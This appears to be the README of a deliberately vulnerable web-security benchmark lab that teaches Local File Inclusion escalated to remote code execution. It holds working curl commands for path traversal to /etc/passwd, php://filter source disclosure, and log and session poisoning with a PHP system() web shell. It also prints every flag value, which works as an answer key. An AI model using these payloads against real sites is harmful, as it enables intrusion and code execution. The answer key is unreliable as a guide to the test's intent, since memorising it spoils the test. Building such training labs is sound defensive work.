# S7BEN-VHARD-010: Local File Inclusion to RCE Chain

![Difficulty](https://img.shields.io/badge/difficulty-intermediate-yellow)
![Tier](https://img.shields.io/badge/tier-2-blue)
![Category](https://img.shields.io/badge/category-web-green)

## Overview

This benchmark demonstrates Local File Inclusion (LFI) vulnerabilities and their escalation to Remote Code Execution (RCE) through log poisoning and session poisoning techniques. Participants will learn to identify LFI, exploit path traversal, read sensitive files, and achieve RCE through multiple attack vectors.

## Learning Objectives

- Understanding Local File Inclusion (LFI) vulnerabilities
- Path traversal and directory traversal exploitation
- Reading sensitive system and application files
- Apache log poisoning for RCE
- PHP session poisoning for RCE
- PHP wrapper exploitation (php://filter, php://input)
- Converting LFI to full system compromise

## Architecture

```
┌─────────────────────────────────────────────────────┐
│  web-app (PHP/Apache)                               │
│  - Port: 8080                                       │
│  - LFI vulnerability in page parameter              │
│  - Flags: /var/www/html/flag.txt, session_flag.txt │
│  IP: 172.28.0.10                                    │
└──────────────────┬──────────────────────────────────┘
                   │ lfi-net
┌──────────────────┴──────────────────────────────────┐
│  file-server (Nginx)                                │
│  - Port: 8081                                       │
│  - Internal file repository                         │
│  - Contains: credentials, confidential files        │
│  IP: 172.28.0.20                                    │
└──────────────────┬──────────────────────────────────┘
                   │ lfi-net
┌──────────────────┴──────────────────────────────────┐
│  log-server (PHP/Apache)                            │
│  - Internal logging service                         │
│  - Shared Apache logs (via Docker volume)           │
│  - Demonstrates log poisoning                       │
│  IP: 172.28.0.30                                    │
└─────────────────────────────────────────────────────┘
```

## Vulnerabilities

| CVE/ID | Vulnerability | Severity | Description |
|--------|---------------|----------|-------------|
| CWE-98 | Improper Control of Filename | Critical | Unsanitized file inclusion |
| CWE-22 | Path Traversal | High | Directory traversal attacks |
| CUSTOM-LFI-01 | Page Parameter LFI | Critical | Direct LFI in page parameter |
| CUSTOM-LFI-02 | Apache Log Poisoning | Critical | RCE via log file poisoning |
| CUSTOM-LFI-03 | PHP Session Poisoning | Critical | RCE via session file poisoning |

## Attack Chain

1. **Phase 1**: LFI Discovery - Identify and test path traversal
2. **Phase 2**: Sensitive File Disclosure - Read configuration and system files
3. **Phase 3**: Apache Log Poisoning - Inject PHP code via User-Agent
4. **Phase 4**: PHP Session Poisoning - Inject code into session data
5. **Phase 5**: Full RCE - Leverage RCE to extract all flags

## Flags

| Flag | Value | Technique | Difficulty |
|------|-------|-----------|------------|
| FLAG_LFI | `S7BEN{lfi_path_traversal_file_read_a1b2c3}` | Path traversal | Easy |
| FLAG_LOG | `S7BEN{apache_log_poisoning_rce_d4e5f6}` | Log poisoning | Medium |
| FLAG_SESSION | `S7BEN{php_session_poisoning_rce_g7h8i9}` | Session poisoning | Medium |
| BONUS | `S7BEN{internal_file_server_access_j1k2l3}` | Internal access | Bonus |

## Quick Start

### Prerequisites

- Docker and Docker Compose
- curl or HTTP client
- Basic understanding of PHP and LFI

### Build and Start

```bash
cd benchmarks/S7BEN-VHARD-010
make build
make up
```

Or manually:
```bash
docker compose build
docker compose up -d
```

### Verify Services

```bash
make test
```

Expected output:
```
Web app: healthy
File server: healthy
Log server: healthy
```

### Access Points

- **Web Application**: http://localhost:8080
- **File Server**: http://localhost:8081
- **Log Server**: Internal only

## Exploitation Examples

### Basic Path Traversal

```bash
# Read /etc/passwd
curl "http://localhost:8080/?page=../../../etc/passwd"

# Read flag file
curl "http://localhost:8080/?page=flag.txt"
```

### PHP Filter Wrapper

```bash
# Read PHP source as base64
curl "http://localhost:8080/?page=php://filter/convert.base64-encode/resource=index.php"
```

### Log Poisoning for RCE

```bash
# Poison User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" "http://localhost:8080/"

# Execute command
curl "http://localhost:8080/?page=/var/log/apache2/access.log&cmd=whoami"
```

### Session Poisoning

```bash
# Inject into session
curl -c cookies.txt "http://localhost:8080/?page=contact&name=<?php system('id'); ?>"

# Get session ID and include session file
SESSION_ID=$(cat cookies.txt | grep PHPSESSID | awk '{print $NF}')
curl -b cookies.txt "http://localhost:8080/?page=/var/lib/php/sessions/sess_$SESSION_ID"
```

## Full Testing Guide

For comprehensive exploitation instructions, see [TESTING.md](TESTING.md).

## Cleanup

```bash
make down
```

Or remove all data:
```bash
make clean
```

## Tools Required

- curl (with cookie support)
- base64 (for decoding php://filter output)
- grep, awk (for parsing)

## Estimated Time

- Setup: 5-10 minutes
- Exploitation: 60-90 minutes
- Total: 65-100 minutes

## Hints

- Common LFI test: `?page=../../../etc/passwd`
- Apache logs: `/var/log/apache2/access.log`
- PHP sessions: `/var/lib/php/sessions/sess_<ID>`
- Use `php://filter` to read PHP source code
- User-Agent header is logged and can be poisoned
- Session data can contain user-controlled input

## Security Notice

⚠️ **WARNING**: This benchmark contains intentional security vulnerabilities.
- **DO NOT** deploy in production environments
- **DO NOT** expose to untrusted networks
- For educational purposes only

## References

- [OWASP: Testing for LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [HackTricks: File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings: LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

## Tags

`lfi` `file-inclusion` `path-traversal` `log-poisoning` `session-poisoning` `rce` `php` `apache` `phase-4`

## Author

Strike7 Security Benchmarks

## Version

1.0.0 (Last updated: 2026-01-14)
